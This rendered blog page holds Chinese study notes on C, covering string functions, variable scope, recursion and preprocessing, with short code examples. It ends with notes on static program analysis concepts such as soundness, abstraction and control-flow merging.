<li>scanf() 可以把读取到的字符丢弃。</li>
</ul>
<h3 id="C语言字符串处理函数"><a href="#C语言字符串处理函数" class="headerlink" title="C语言字符串处理函数"></a>C语言字符串处理函数</h3><h4 id="字符串连接函数-strcat"><a href="#字符串连接函数-strcat" class="headerlink" title="字符串连接函数 strcat()"></a>字符串连接函数 strcat()</h4><p>strcat 是 string catenate 的缩写，意思是把两个字符串拼接在一起，语法格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcat(arrayName1, arrayName2);</span><br></pre></td></tr></table></figure>

<p>arrayName1、arrayName2 为需要拼接的字符串。</p>
<blockquote>
<p>strcat() 将把 arrayName2 连接到 arrayName1 后面，并删除原来 arrayName1 最后的结束标志<code>&#39;\0&#39;</code>。这意味着，arrayName1 必须足够长，要能够同时容纳 arrayName1 和 arrayName2，否则会越界（超出范围）。</p>
</blockquote>
<p><strong>strcat() 的返回值为 arrayName1 的地址。</strong></p>
<h4 id="字符串复制函数-strcpy"><a href="#字符串复制函数-strcpy" class="headerlink" title="字符串复制函数 strcpy()"></a>字符串复制函数 strcpy()</h4><p>strcpy 是 string copy 的缩写，意思是字符串复制，也即将字符串从一个地方复制到另外一个地方，语法格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcpy(arrayName1, arrayName2);</span><br></pre></td></tr></table></figure>

<p>strcpy() 会把 arrayName2 中的字符串拷贝到 arrayName1 中，字符串结束标志<code>&#39;\0&#39;</code>也一同拷贝。请看下面的例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> str1[<span class="number">50</span>] = <span class="string">&quot;《C语言变怪兽》&quot;</span>;</span><br><span class="line">    <span class="type">char</span> str2[<span class="number">50</span>] = <span class="string">&quot;http://c.biancheng.net/cpp/u/jiaocheng/&quot;</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(str1, str2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str1: %s\n&quot;</span>, str1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：<br>str1: <a target="_blank" rel="noopener" href="http://c.biancheng.net/cpp/u/jiaocheng/">http://c.biancheng.net/cpp/u/jiaocheng/</a></p>
<p>你看，将 str2 复制到 str1 后，str1 中原来的内容就被覆盖了。</p>
<p>另外，strcpy() 要求 arrayName1 要有足够的长度，否则不能全部装入所拷贝的字符串。</p>
<h4 id="字符串比较函数-strcmp"><a href="#字符串比较函数-strcmp" class="headerlink" title="字符串比较函数 strcmp()"></a>字符串比较函数 strcmp()</h4><p>strcmp 是 string compare 的缩写，意思是字符串比较，语法格式为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcmp</span>(arrayName1, arrayName2);</span><br></pre></td></tr></table></figure>

<p>arrayName1 和 arrayName2 是需要比较的两个字符串。</p>
<p>字符本身没有大小之分，strcmp() 以各个字符对应的 ASCII 码值进行比较。strcmp() 从两个字符串的第 0 个字符开始比较，如果它们相等，就继续比较下一个字符，直到遇见不同的字符，或者到字符串的末尾。</p>
<p>返回值：若 arrayName1 和 arrayName2 相同，则返回0；若 arrayName1 大于 arrayName2，则返回大于 0 的值；若 arrayName1 小于 arrayName2，则返回小于0 的值。</p>
<p>对4组字符串进行比较：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[] = <span class="string">&quot;aBcDeF&quot;</span>;</span><br><span class="line">    <span class="type">char</span> b[] = <span class="string">&quot;AbCdEf&quot;</span>;</span><br><span class="line">    <span class="type">char</span> c[] = <span class="string">&quot;aacdef&quot;</span>;</span><br><span class="line">    <span class="type">char</span> d[] = <span class="string">&quot;aBcDeF&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a VS b: %d\n&quot;</span>, <span class="built_in">strcmp</span>(a, b));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a VS c: %d\n&quot;</span>, <span class="built_in">strcmp</span>(a, c));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a VS d: %d\n&quot;</span>, <span class="built_in">strcmp</span>(a, d));</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：<br>a VS b: 32<br>a VS c: -31<br>a VS d: 0</p>
<h2 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h2><h3 id="库函数和自定义函数"><a href="#库函数和自定义函数" class="headerlink" title="库函数和自定义函数"></a>库函数和自定义函数</h3><p>C语言在发布时已经为我们封装好了很多函数，它们被分门别类地放到了不同的头文件中（暂时先这样认为），使用函数时引入对应的头文件即可。这些函数都是专家编写的，执行效率极高，并且考虑到了各种边界情况，各位读者请放心使用。</p>
<p>C语言自带的函数称为库函数（Library Function）。库（Library）是编程中的一个基本概念，可以简单地认为它是一系列函数的集合，在磁盘上往往是一个文件夹。C语言自带的库称为标准库（Standard Library），其他公司或个人开发的库称为第三方库（Third-Party Library）。</p>
<h3 id="C语言全局变量和局部变量"><a href="#C语言全局变量和局部变量" class="headerlink" title="C语言全局变量和局部变量"></a>C语言全局变量和局部变量</h3><p>形参变量要等到函数被调用时才分配内存，调用结束后立即释放内存。这说明形参变量的作用域非常有限，只能在函数内部使用，离开该函数就无效了。所谓作用域（Scope），就是变量的有效范围。</p>
<p>不仅对于形参变量，C语言中所有的变量都有自己的作用域。决定变量作用域的是变量的定义位置。</p>
<h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><p>定义在函数内部的变量称为<strong>局部变量（Local Variable）</strong>，它的作用域仅限于函数内部， 离开该函数后就是无效的，再使用就会报错。例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f1</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">    <span class="type">int</span> b,c;  <span class="comment">//a,b,c仅在函数f1()内有效</span></span><br><span class="line">    <span class="keyword">return</span> a+b+c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> m,n;  <span class="comment">//m,n仅在函数main()内有效</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>在 main 函数中定义的变量也是局部变量，只能在 main 函数中使用；同时，main 函数中也不能使用其它函数中定义的变量。main 函数也是一个函数，与其它函数地位平等。</p>
</li>
<li><p>形参变量、在函数体内定义的变量都是局部变量。实参给形参传值的过程也就是给局部变量赋值的过程。</p>
</li>
<li><p>可以在不同的函数中使用相同的变量名，它们表示不同的数据，分配不同的内存，互不干扰，也不会发生混淆。</p>
</li>
<li><p>在语句块中也可定义变量，它的作用域只限于当前语句块。</p>
</li>
</ol>
<h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>在所有函数外部定义的变量称为<strong>全局变量（Global Variable）</strong>，它的作用域默认是整个程序，也就是所有的源文件，包括 .c 和 .h 文件。例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a, b;  <span class="comment">//全局变量</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">float</span> x,y;  <span class="comment">//全局变量</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>a、b、x、y 都是在函数外部定义的全局变量。C语言代码是从前往后依次执行的，由于 x、y 定义在函数 func1() 之后，所以在 func1() 内无效；而 a、b 定义在源程序的开头，所以在 func1()、func2() 和 main() 内都有效。</p>
<h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>所谓<strong>作用域（Scope）</strong>，就是变量的有效范围，就是变量可以在哪个范围以内使用。有些变量可以在所有代码文件中使用，有些变量只能在当前的文件中使用，有些变量只能在函数内部使用，有些变量只能在 <a target="_blank" rel="noopener" href="https://c.biancheng.net/view/172.html">for 循环</a>内部使用。</p>
<p>变量的作用域由变量的定义位置决定，在不同位置定义的变量，它的作用域是不一样的。</p>
<blockquote>
<p>全局变量的默认作用域是整个程序，也就是所有的代码文件，包括源文件（<code>.c</code>文件）和头文件（<code>.h</code>文件）。如果给全局变量加上 <strong>static</strong> 关键字，它的作用域就变成了当前文件，在其它文件中就无效了。</p>
</blockquote>
<p><strong>重点：</strong></p>
<p><strong>在一个函数内部修改全局变量的值会影响其它函数，全局变量的值在函数内部被修改后并不会自动恢复，它会一直保留该值，直到下次被修改。</strong></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240218162253460.png" alt="image-20240218162253460" style="zoom: 67%;" />

<p>可以看到两个变量a的地址是不一样的。</p>
<p>全局变量也是变量，变量只能保存一份数据，一旦数据被修改了，原来的数据就被冲刷掉了，再也无法恢复了，所以不管是全局变量还是局部变量，一旦它的值被修改，这种影响都会一直持续下去，直到再次被修改。</p>
<h4 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h4><p>C语言规定，在同一个作用域中不能出现两个名字相同的变量，否则会产生命名冲突；但是在不同的作用域中，允许出现名字相同的变量，它们的作用范围不同，彼此之间不会产生冲突。这句话有两层含义：</p>
<ul>
<li>不同函数内部可以出现同名的变量，不同函数是不同的局部作用域；</li>
<li>函数内部和外部可以出现同名的变量，函数内部是局部作用域，函数外部是全局作用域。</li>
</ul>
<h3 id="块级变量"><a href="#块级变量" class="headerlink" title="块级变量"></a>块级变量</h3><p>所谓代码块，就是由<code>&#123; &#125;</code>包围起来的代码。代码块在C语言中随处可见，例如函数体、选择结构、循环结构等。</p>
<p>C语言允许在代码块内部定义变量，这样的变量具有块级作用域；换句话说，在代码块内部定义的变量只能在代码块内部使用，出了代码块就无效了。</p>
<h4 id="for循环内定义变量"><a href="#for循环内定义变量" class="headerlink" title="for循环内定义变量"></a>for循环内定义变量</h4><p>在 for 循环条件里面定义新变量，这样的变量也是块级变量，它的作用域仅限于 for 循环内部。</p>
<p>如果一个变量只在 for 循环内部使用，就可以将它定义在循环条件里面，这样做可以避免在函数开头定义过多的变量，使得代码结构更加清晰。</p>
<h4 id="单独的代码块"><a href="#单独的代码块" class="headerlink" title="单独的代码块"></a>单独的代码块</h4><p>C语言还允许出现单独的代码块，它也是一个作用域。请看下面的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">22</span>;  <span class="comment">//编号①</span></span><br><span class="line">    <span class="comment">//由&#123; &#125;包围的代码块</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">40</span>;  <span class="comment">//编号②</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;block n: %d\n&quot;</span>, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main n: %d\n&quot;</span>, n);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有两个 n，它们位于不同的作用域，不会产生命名冲突。{ } 的作用域比 main() 更小，{ } 内部的 printf() 使用的是编号为②的 n，main() 内部的 printf() 使用的是编号为①的 n。</p>
<h4 id="再谈作用域"><a href="#再谈作用域" class="headerlink" title="再谈作用域"></a>再谈作用域</h4><p>每个C语言程序都包含了多个作用域，不同的作用域中可以出现同名的变量，C语言会按照从小到大的顺序、一层一层地去父级作用域中查找变量，如果在最顶层的全局作用域中还未找到这个变量，那么就会报错。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> m = <span class="number">13</span>;</span><br><span class="line"><span class="type">int</span> n = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">20</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">822</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;block1 n: %d\n&quot;</span>, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func1 n: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func2</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">5</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;if m: %d\n&quot;</span>, m);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">int</span> n = i % <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span>(n&lt;<span class="number">2</span> &amp;&amp; n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;else m: %d\n&quot;</span>, m);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func2 n: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func3</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func3 n: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">30</span>;</span><br><span class="line">    func1();</span><br><span class="line">    func2(n);</span><br><span class="line">    func3();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main n: %d\n&quot;</span>, n);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作用域示意图如下：</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/1-1Z1031306123V.jpg" alt="C语言作用域示意图" style="zoom:50%;" />

<h3 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h3><p>一个函数在它的函数体内调用它自身称为<strong>递归调用</strong>，这种函数称为<strong>递归函数</strong>。执行递归函数将反复调用其自身，每调用一次就进入新的一层，当最内层的函数执行完毕后，再一层一层地由里到外退出。</p>
<h4 id="求阶乘"><a href="#求阶乘" class="headerlink" title="求阶乘"></a>求阶乘</h4><p><img src= "/img/friend_404.gif" data-lazy-src="/image/1310025941-0.gif" alt="img"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//求n的阶乘</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">factorial</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span> || n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> factorial(n - <span class="number">1</span>) * n;  <span class="comment">// 递归调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input a number: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Factorial(%d) = %ld\n&quot;</span>, a, factorial(a));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>factorial() 就是一个典型的递归函数。调用 factorial() 后即进入函数体，只有当 n&#x3D;&#x3D;0 或 n&#x3D;&#x3D;1 时函数才会执行结束，否则就一直调用它自身。</p>
<p>由于每次调用的实参为 n-1，即把 n-1 的值赋给形参 n，所以每次递归实参的值都减 1，直到最后 n-1 的值为 1 时再作递归调用，形参 n 的值也为1，递归就终止了，会逐层退出。</p>
<p>要想理解递归函数，重点是理解它是如何逐层进入，又是如何逐层退出的，下面我们以 5! 为例进行讲解。</p>
<h5 id="递归的进入"><a href="#递归的进入" class="headerlink" title="递归的进入"></a>递归的进入</h5><ol>
<li>首先输入5，此时n不等于0或1，进入else分支后return了一个自身n-1，此时进入到factorial(4)，必须先调用 factorial(4)，并暂停其他操作。换句话说，在得到 factorial(4) 的结果之前，不能进行其他操作。这就是第一次递归。</li>
<li>继续进入else分支，直到第五次，factorial(1)时n的值为1，此时直接return 1，结束递归</li>
</ol>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240218164623194.png" alt="image-20240218164623194" style="zoom:67%;" />

<h5 id="递归的退出"><a href="#递归的退出" class="headerlink" title="递归的退出"></a>递归的退出</h5><ol>
<li>n 的值为 1 时达到最内层，此时 return 出去的结果为 1，也即 factorial(1) 的调用结果为 1。</li>
<li>有了 factorial(1) 的结果，就可以返回上一层计算<code>factorial(1) * 2</code>的值了。此时得到的值为 2，return 出去的结果也为 2，也即 factorial(2) 的调用结果为 2。</li>
<li>以此类推，当得到 factorial(4) 的调用结果后，就可以返回最顶层。经计算，factorial(4) 的结果为 24，那么表达式<code>factorial(4) * 5</code>的结果为 120，此时 return 得到的结果也为 120，也即 factorial(5) 的调用结果为 120，这样就得到了 5! 的值。</li>
</ol>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240218164824215.png" alt="image-20240218164824215" style="zoom:67%;" />

<h4 id="递归的条件"><a href="#递归的条件" class="headerlink" title="递归的条件"></a>递归的条件</h4><p>每一个递归函数都应该只进行有限次的递归调用，否则它就会进入死胡同，永远也不能退出了，这样的程序是没有意义的。</p>
<p>要想让递归函数逐层进入再逐层退出，需要解决两个方面的问题：</p>
<ul>
<li>存在限制条件，当符合这个条件时递归便不再继续。对于 factorial()，当形参 n 等于 0 或 1 时，递归就结束了。</li>
<li>每次递归调用之后越来越接近这个限制条件。对于 factorial()，每次递归调用的实参为 n - 1，这会使得形参 n 的值逐渐减小，越来越趋近于 1 或 0。</li>
</ul>
<h2 id="C语言预处理命令"><a href="#C语言预处理命令" class="headerlink" title="C语言预处理命令"></a>C语言预处理命令</h2><h3 id="预处理命令是什么"><a href="#预处理命令是什么" class="headerlink" title="预处理命令是什么"></a>预处理命令是什么</h3><p>使用库函数之前，应该用<code>#include</code>引入对应的头文件。这种以<code>#</code>号开头的命令称为预处理命令。</p>
<p>C语言源文件要经过编译、链接才能生成可执行程序：</p>
<ol>
<li>编译（Compile）会将源文件（<code>.c</code>文件）转换为目标文件。对于 VC&#x2F;VS，目标文件后缀为<code>.obj</code>；对于<a target="_blank" rel="noopener" href="https://c.biancheng.net/gcc/">GCC</a>，目标文件后缀为<code>.o</code>。</li>
</ol>
<blockquote>
<p>编译是针对单个源文件的，一次编译操作只能编译一个源文件，如果程序中有多个源文件，就需要多次编译操作。</p>
</blockquote>
<ol start="2">
<li>链接（Link）是针对多个文件的，它会将编译生成的多个目标文件以及系统中的库、组件等合并成一个可执行程序。</li>
</ol>
<p>在编译之前对源文件进行简单加工的过程，就称为<strong>预处理</strong>（即预先处理、提前处理）。</p>
<p>预处理主要是处理以<code>#</code>开头的命令，例如<code>#include &lt;stdio.h&gt;</code>等。预处理命令要放在所有函数之外，而且一般都放在源文件的前面。</p>
<h1 id="软件分析"><a href="#软件分析" class="headerlink" title="软件分析"></a>软件分析</h1><h2 id="Introduce"><a href="#Introduce" class="headerlink" title="Introduce"></a>Introduce</h2><h3 id="可靠性的必要性（soundness）"><a href="#可靠性的必要性（soundness）" class="headerlink" title="可靠性的必要性（soundness）"></a>可靠性的必要性（soundness）</h3><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240129111441691.png" alt="image-20240129111441691" style="zoom:80%;" />

<p>如果只考虑B路径是sound，但是需要考虑B、C两条路径（B强转B没问题但如果走了路径C，C强转B就会报错）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//说明B和C是A的接口子类，a是A的一个实例</span></span><br><span class="line"><span class="type">B</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();         <span class="type">C</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C</span>();</span><br><span class="line">a.fld = b;              a.fld = c;</span><br><span class="line">    \                      /</span><br><span class="line">     \                    /</span><br><span class="line">      \                  /</span><br><span class="line">        <span class="type">B</span> <span class="variable">b2</span> <span class="operator">=</span> (B)a.fld;</span><br></pre></td></tr></table></figure>

<p>我们想知道第7行的cast（类型转换）是否safe：</p>
<ul>
<li>Unsound ：只考虑单一的路径，如果只考虑左边路径，是没问题的，但是如果只考虑右边的路径，会产生运行时异常。</li>
<li>Sound（全面考虑）：对于所有可能的路径都进行考虑。</li>
</ul>
<p>所有的静态分析都是在追求Sound，可以牺牲精度。</p>
<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(input)</span><br><span class="line">&#123;</span><br><span class="line">  x = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">eles</span><br><span class="line">&#123;</span><br><span class="line">  x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">-&gt; x = ?</span><br></pre></td></tr></table></figure>

<p>静态分析可以得到两种结论：</p>
<ol>
<li>input为真时，x为1；input为假时，x为0. 【Sound，precise，expensive（慢）】</li>
<li>x为1或0 【Sound，imprecise，cheap（快）】</li>
</ol>
<p>上述两种结论都已经跑完了所有的路径了，所以可以认为是Sound的。</p>
<p><strong>在静态分析中还有一种看法是：可以认为Sound的就是正确的。</strong></p>
<p>譬如，如果我们说x&#x3D;0，1，2，3，4，5。这显然对于x的值有错误，但是对于真正的值0和1都包含在内了，根据Sound的定义，我们可以说这个结论是Sound的，也就是这个结论在静态分析的角度来说是正确的。</p>
<p>如果说x &#x3D; -1，1，2，3，4。 虽然只和上面的结论相差一个0，但是0是我们在某一路径下的情况，所以并没有包含真正的值，这就不是Sound的，对于静态分析而言，这也就不是正确的。</p>
<h3 id="Static-Analysis-Abstraction-Overapproximation"><a href="#Static-Analysis-Abstraction-Overapproximation" class="headerlink" title="Static Analysis &#x3D; Abstraction + Overapproximation"></a>Static Analysis &#x3D; Abstraction + Overapproximation</h3><h4 id="抽象（Abstraction）"><a href="#抽象（Abstraction）" class="headerlink" title="抽象（Abstraction）"></a>抽象（Abstraction）</h4><p>Determine the sign（+ - 0 top bottom ）of all the variables of a given program.</p>
<p>正数就是+， 负数就是-，零就是0， 不确定是什么就是top（unknown），错误就是bottom（undefined）</p>
<p>抽象就是将Concrete Domain中的值向Abstract Domain做一个映射</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240129113358291.png" alt="image-20240129113358291" style="zoom: 67%;" />

<h4 id="Overapproximate：Transfer-Function（过度近似：函数转化）"><a href="#Overapproximate：Transfer-Function（过度近似：函数转化）" class="headerlink" title="Overapproximate：Transfer Function（过度近似：函数转化）"></a>Overapproximate：Transfer Function（过度近似：函数转化）</h4><p>转换函数定义了如何计算抽象值，它是被我们分析的问题和语义共同定义的。</p>
<p>这些运算法则在一定程度上遵循了数学中的法则：如负负得正、负正为负，但也会有一些不同</p>
<p>正数和负数相加为top（unknown），除以0为bottom（undefined）</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240129113750511.png" alt="image-20240129113750511" style="zoom:67%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240129114056214.png" alt="image-20240129114056214" style="zoom: 67%;" />

<p>其中①是除0报错，②是负数索引报错，都是有用的，但是③中a可正可负，有可能正常有可能负索引报错，可能为误报</p>
<h4 id="Overapproximate：Control-Flow（控制流）"><a href="#Overapproximate：Control-Flow（控制流）" class="headerlink" title="Overapproximate：Control Flow（控制流）"></a>Overapproximate：Control Flow（控制流）</h4><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240129114737667.png" alt="image-20240129114737667" style="zoom: 67%;" />

<p>对于分支的汇聚的点，都要进行merge（合并），进行抽象。</p>
<p>无法枚举所有的分支，所以flow- merging被使用在大多数的静态分析中 。</p>
